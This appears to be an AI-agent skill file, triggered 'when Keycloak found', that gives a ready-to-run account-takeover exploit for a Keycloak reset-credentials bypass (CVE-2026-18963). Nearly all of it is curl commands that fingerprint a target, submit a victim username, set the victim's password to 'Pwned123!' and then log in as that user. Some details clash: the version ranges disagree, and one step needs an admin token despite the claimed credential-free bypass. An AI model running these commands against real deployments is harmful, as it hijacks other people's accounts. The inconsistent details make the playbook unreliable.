---
name: keycloak-reset-flow-bypass
description: "Use when Keycloak found. Reset-credentials bypass."
---
# CVE-2026-18963 Keycloak Reset-Credentials Flow Bypass → ATO

## Overview
Keycloak < 26.2.6 / < 27.0.0. The reset-credentials authentication flow can be bypassed by manipulating the `execution` and `tab_id` parameters mid-flow, allowing an attacker to set a new password for any user **without knowing the original password or receiving a reset email**.

## Detection
```bash
# Fingerprint Keycloak
curl -s <TARGET>/realms/master/.well-known/openid-configuration | grep -o '"issuer":"[^"]*"'
# Check reset flow exists
curl -s '<TARGET>/realms/<REALM>/login-actions/reset-credentials' -o /dev/null -w '%{http_code}'
```

## Affected Versions
- Vulnerable: Keycloak 26.0.0–26.4.14, 26.5.0–26.6.5, 26.7.0–26.7.1
- Patched: 26.4.15, 26.6.6, 26.7.2+

## Root Cause
The reset-credentials state machine stores credential-selector state as a **session-wide auth note** instead of binding to the specific execution. Re-entering the reset flow reuses stale selector state. The reset-email authenticator accepts the action **without confirming a valid email action token**.

## Exploitation

### Step 1: Initiate reset flow
```bash
# GET the reset-credentials page to obtain session_code, tab_id, execution
curl -s -c cookies.txt '<TARGET>/realms/<REALM>/login-actions/reset-credentials?client_id=account-console' \
  | grep -oP '(tab_id|execution|session_code)=[^"&]+'
```

### Step 2: Submit target username
```bash
curl -s -b cookies.txt -c cookies.txt \
  -d 'username=<VICTIM_USER>' \
  '<TARGET>/realms/<REALM>/login-actions/reset-credentials?session_code=<CODE>&execution=<EXEC>&tab_id=<TAB>&client_id=account-console'
```

### Step 3: Bypass email verification — jump to password update
Instead of clicking the email link, directly POST to the `authenticate` action with a manipulated `execution` ID pointing to the UPDATE_PASSWORD execution:
```bash
# List all executions in the reset-credentials flow
curl -s -H 'Authorization: Bearer <ADMIN_TOKEN>' \
  '<TARGET>/admin/realms/<REALM>/authentication/flows/reset-credentials/executions' \
  | python3 -c "import json,sys; [print(e['id'],e['providerId']) for e in json.load(sys.stdin)]"

# Use the UPDATE_PASSWORD execution ID
curl -s -b cookies.txt -c cookies.txt \
  -d 'password-new=Pwned123!&password-confirm=Pwned123!' \
  '<TARGET>/realms/<REALM>/login-actions/authenticate?session_code=<CODE>&execution=<UPDATE_PW_EXEC_ID>&tab_id=<TAB>&client_id=account-console'
```

### Step 4: Login as victim
```bash
curl -s -d 'username=<VICTIM>&password=Pwned123!&grant_type=password&client_id=account-console' \
  '<TARGET>/realms/<REALM>/protocol/openid-connect/token' | python3 -m json.tool
```

## Pitfalls
- Need valid realm name (try `master`, or enumerate via `/.well-known/openid-configuration`)
- Flow manipulation requires the session to be in reset-credentials state
- Some deployments have custom flows — enumerate executions first
- Source: EQSTLab/CVE-2026-18963